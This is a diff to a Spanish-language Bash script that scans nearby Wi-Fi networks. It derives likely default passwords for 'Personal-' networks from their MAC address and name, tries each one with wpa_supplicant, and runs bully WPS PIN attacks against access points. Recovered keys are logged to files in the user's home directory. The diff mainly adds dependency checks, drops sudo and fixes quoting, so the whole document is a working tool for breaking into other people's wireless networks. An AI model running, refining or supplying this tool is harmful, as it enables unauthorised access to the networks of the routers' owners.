@@ -15,6 +15,46 @@ DELAY=10s
 
 TMP="/tmp/redes.txt"
 
+# Chequeo de dependencias
+REQUIRED_CMDS=(iw iwlist wpa_passphrase wpa_supplicant timeout bully pkill awk sed grep ip)
+declare -A PKG_MAP=(
+  [iw]=iw
+  [iwlist]=wireless-tools
+  [wpa_passphrase]=wpa-supplicant
+  [wpa_supplicant]=wpa-supplicant
+  [timeout]=coreutils
+  [bully]=bully
+  [pkill]=procps
+  [awk]=gawk
+  [sed]=sed
+  [grep]=grep
+  [ip]=iproute2
+)
+
+missing=()
+pkgs=()
+for cmd in "${REQUIRED_CMDS[@]}"; do
+  if ! command -v "$cmd" >/dev/null 2>&1; then
+    missing+=("$cmd")
+    pkg="${PKG_MAP[$cmd]:-$cmd}"
+    # evitar duplicados en pkgs
+    case " ${pkgs[*]} " in
+      *" $pkg "*) ;;
+      *) pkgs+=("$pkg") ;;
+    esac
+  fi
+done
+
+if [ "${#missing[@]}" -ne 0 ]; then
+  echo -e "\n[ERROR] Faltan dependencias: ${missing[*]}"
+  echo "Instálalas en Debian/Ubuntu con:"
+  echo "  sudo apt-get update && sudo apt-get install -y ${pkgs[*]}"
+  exit 1
+fi
+
+# Chequeo de dependencias
+
+
 trap cleanup INT
 
 uso() {
@@ -23,16 +63,19 @@ uso() {
 	exit 1
 }
 
+
+
+
 modomanager() {
-	sudo ip link set $INTERFACE down 2>/dev/null
-	sudo iw dev $INTERFACE set type managed
-	sudo ip link set $INTERFACE up 2>/dev/null
+	 ip link set "$INTERFACE" down 2>/dev/null
+	 iw dev "$INTERFACE" set type managed
+	 ip link set "$INTERFACE" up 2>/dev/null
 }
 
 modomonitor() {
-	sudo ip link set "$INTERFACE" down 2>/dev/null
-	sudo iw "$INTERFACE" set monitor control
-	sudo ip link set "$INTERFACE" up 2>/dev/null
+	 ip link set "$INTERFACE" down 2>/dev/null
+	 iw "$INTERFACE" set monitor control
+	 ip link set "$INTERFACE" up 2>/dev/null
 }
 
 cleanup() {
@@ -82,9 +125,9 @@ if [ "$EUID" -ne 0 ]; then
 fi
 
 # Determina la interfaz inalámbrica por defecto si no se pasa como parámetro
-if [ -z "$INTERFACE" ]; then
-	INTERFACE=$(iw dev 2>/dev/null | awk '/Interface/{iface=$2} /type/{mode=$2; if(mode=="managed"){print iface}}' | head -n1)
-fi
+#if [ -z "$INTERFACE" ]; then
+#	INTERFACE=$(iw dev 2>/dev/null | awk '/Interface/{iface=$2} /type/{mode=$2; if(mode=="managed"){print iface}}' | head -n1)
+#fi
 
 # Validar que se encontró una interfaz
 if [ ! -z "$INTERFACE" ]; then
@@ -107,7 +150,7 @@ function intentoConexionWPS() {
 		echo -e "\n\n${BLUE}${BOLD}📡 Probando${RESET}: ${BOLD}${MAC}${RESET} ${BLUE}(ESSID: ${BOLD}${ESSID}${RESET}${BLUE}, Canal: ${BOLD}${CHAN}${RESET}${BLUE}, Señal: -${BOLD}${SENIAL} dBm${RESET}${BLUE})${RESET}\n\n"
 	fi
 
-	sudo timeout $DELAY bully -b "$MAC" -B -p "$PIN" -v3 "$INTERFACE" | tee -a "/tmp/bully_output.log" | {
+	timeout $DELAY bully -b "$MAC" -B -p "$PIN" -v3 "$INTERFACE" | tee -a "/tmp/bully_output.log" | {
 		timeout_count=0
 
 		while IFS= read -r line; do
@@ -135,7 +178,7 @@ function intentoConexionWPS() {
 				echo -e "\n${GREEN}${BOLD}[✓] PIN correcto para ${RESET}${BOLD}${MAC}${RESET}${GREEN} - PIN: ${RESET}${BOLD}${PIN}${RESET}${GREEN} - KEY: ${RESET}${BOLD}${KEY}${RESET}"
 				echo -e "\n${YELLOW}Conectarse (WPS) a ${BOLD}${ESSID}${RESET}${YELLOW} con la Clave: ${RESET}${BOLD}${KEY}${RESET}${YELLOW} y MACAddress: ${RESET}${BOLD}${MAC}${RESET} --> ${GREEN}${BOLD}[OK]${RESET}\n"
 				echo "[$(date '+%F %T')] OK  | ${MAC} | ${ESSID} | ${PIN}| ${KEY}" >>"$HOME/wifiwps-password-default.txt"
-				sudo pkill -f "bully.*$MAC"
+				pkill -f "bully.*$MAC"
 				break
 			fi
 
@@ -144,7 +187,7 @@ function intentoConexionWPS() {
 
 				echo -e "\n${YELLOW}Conectarse (WPS) a ${BOLD}${ESSID}${RESET}${YELLOW} con la Clave: ${BOLD}${PIN}${RESET}${YELLOW} y MACAddress: ${BOLD}${MAC}${RESET} --> ${RED}${BOLD}[FALLÓ]${RESET}\n"
 				echo "[$(date '+%F %T')] FAIL  | ${MAC} | ${ESSID} | ${PIN}" >>"$HOME/wifiwps-sin-password-por-defecto.txt"
-				sudo pkill -f "bully.*$MAC"
+				pkill -f "bully.*$MAC"
 				break
 			fi
 
@@ -152,7 +195,7 @@ function intentoConexionWPS() {
 
 	}
 
-	if [ ! "$(grep -i "$macaddress" $HOME/wifiwps-sin-password-por-defecto.txt 2>/dev/null)" ] && [ ! "$(grep -i "$macaddress" $HOME/wifiwps-password-default.txt 2>/dev/null)" ]; then
+	if [ ! "$(grep -i "$MAC" $HOME/wifiwps-sin-password-por-defecto.txt 2>/dev/null)" ] && [ ! "$(grep -i "$MAC" $HOME/wifiwps-password-default.txt 2>/dev/null)" ]; then
 
 		echo -e "\n${YELLOW}Conectarse (WPS) a ${BOLD}${ESSID}${RESET}${YELLOW} con la Clave: ${BOLD}${PIN}${RESET}${YELLOW} y MACAddress: ${BOLD}${MAC}${RESET} --> ${RED}${BOLD}[FALLÓ]${RESET}\n"
 		echo "[$(date '+%F %T')] FAIL  | ${MAC} | ${ESSID} | ${PIN}" >>"$HOME/wifiwps-sin-password-por-defecto.txt"
@@ -174,10 +217,10 @@ function IntentoConexion() {
 	rm -f /tmp/wpa_supplicant.conf /tmp/wpa_respuesta.log 2>/dev/null
 
 	# Generar configuración wpa_supplicant (silenciado en pantalla)
-	sudo wpa_passphrase "$ssid" "$clave" | tee /tmp/wpa_supplicant.conf >/dev/null 2>&1
+	wpa_passphrase "$ssid" "$clave" | tee /tmp/wpa_supplicant.conf >/dev/null 2>&1
 
 	# Ejecutar wpa_supplicant con timeout y guardar salida en log temporal
-	timeout $DELAY sudo wpa_supplicant -i "$interface" -c /tmp/wpa_supplicant.conf >/tmp/wpa_respuesta.log 2>&1 || true
+	timeout $DELAY wpa_supplicant -i "$interface" -c /tmp/wpa_supplicant.conf >/tmp/wpa_respuesta.log 2>&1 || true
 
 	# Comprobar resultado
 	if grep -qi "CTRL-EVENT-CONNECTED" /tmp/wpa_respuesta.log; then
@@ -222,10 +265,10 @@ function MostrarRed() {
 }
 
 function borrarTemporales() {
-	sudo rm /tmp/redes.txt 2>/dev/null
-	sudo rm /tmp/bully_output.log 2>/dev/null
-	sudo rm /tmp/wpa_respuesta.log 2>/dev/null
-	sudo rm /tmp/wpa_supplicant.conf 2>/dev/null
+	 rm /tmp/redes.txt 2>/dev/null
+	 rm /tmp/bully_output.log 2>/dev/null
+	 rm /tmp/wpa_respuesta.log 2>/dev/null
+	 rm /tmp/wpa_supplicant.conf 2>/dev/null
 }
 
 function bloqueCompleto() {
@@ -261,7 +304,7 @@ while true; do
 	spinner &
 	SPINNER_PID=$!
 
-	sudo iwlist "$INTERFACE" scan 2>/dev/null >"$TMP"
+	iwlist "$INTERFACE" scan 2>/dev/null >"$TMP"
 
 	awk '/Cell /{print ""; print $0; next} {print}' "$TMP" |
 
@@ -299,16 +342,16 @@ while true; do
 							fi
 							if [ -n "$senial" ] && [ "$senial" -ge "$TOPSENIAL" ]; then
 
-								if [[ "$line" =~ ESSID:\"(Personal-[^\"]+)\" ]]; then
+								if [[ "$line" =~ ESSID:\"([Pp]ersonal-[^\"]+)\" ]]; then
 									essid=$(echo $line | grep "ESSID: *" | awk -F: '{print $2}' | sed 's/"//g')
 									subssid=$(echo "$essid" | grep -Po 'Personal(?:-WiFi)?-\K[A-Za-z0-9]{3}(?![a-zA-Z0-9])')
 									clave=$(echo "$mac$subssid")
 
 									if [ ! "$(grep -i "$macaddress" $HOME/wifi-sin-password-por-defecto.txt 2>/dev/null)" ] && [ ! "$(grep -i "$macaddress" $HOME/wifi-password-default.txt 2>/dev/null)" ]; then
 
-										MostrarRed "$essid" "$clave" "$macaddress" "$canal" $INTERFACE
+										MostrarRed "$essid" "$clave" "$macaddress" "$canal" "$INTERFACE"
 
-										IntentoConexion "$essid" "$clave" "$macaddress" $INTERFACE
+										IntentoConexion "$essid" "$clave" "$macaddress" "$INTERFACE"
 
 									fi
 
@@ -319,9 +362,9 @@ while true; do
 
 									if [ ! "$(grep -i "$macaddress" $HOME/wifi-sin-password-por-defecto.txt 2>/dev/null)" ] && [ ! "$(grep -i "$macaddress" $HOME/wifi-password-default.txt 2>/dev/null)" ]; then
 
-										MostrarRed "$essid" "$clave" "$macaddress" "$canal" $INTERFACE
+										MostrarRed "$essid" "$clave" "$macaddress" "$canal" "$INTERFACE"
 
-										IntentoConexion "$essid" "$clave" $macaddress $INTERFACE
+										IntentoConexion "$essid" "$clave" $macaddress "$INTERFACE"
 
 									fi
 
